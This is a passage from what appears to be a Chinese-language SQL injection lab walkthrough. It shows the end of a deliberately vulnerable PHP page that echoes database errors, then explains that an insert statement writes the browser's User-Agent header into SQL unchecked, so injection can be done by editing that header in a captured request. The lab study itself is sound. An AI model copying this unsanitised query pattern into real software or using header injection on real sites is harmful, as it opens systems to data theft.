            //echo "Try again looser";
            print_r(mysql_error());
            echo "&lt;/br&gt;";            
            echo "&lt;/br&gt;";
            echo '&lt;img src="../images/slap.jpg"   /&gt;';    
            echo "&lt;/font&gt;";  
            }

    }

?&gt;


&lt;/font&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
```

#### 2.分析原码

从上面的SQL语句当中我们可以看到对执行的insert语句没有任何的限制，也就是说我们通过修改http的头部信息可以达到SQL注入的效果。

为了查看方便在第103行下面添加“echo $insert;”来返回$insert。

#### 3.寻找注入方式

输入账号密码后抓包可以看到浏览器信息已经被写到了SQL语句中，因此，我们如果想注入，就可以在数据包中的浏览器信息部分进行操作。
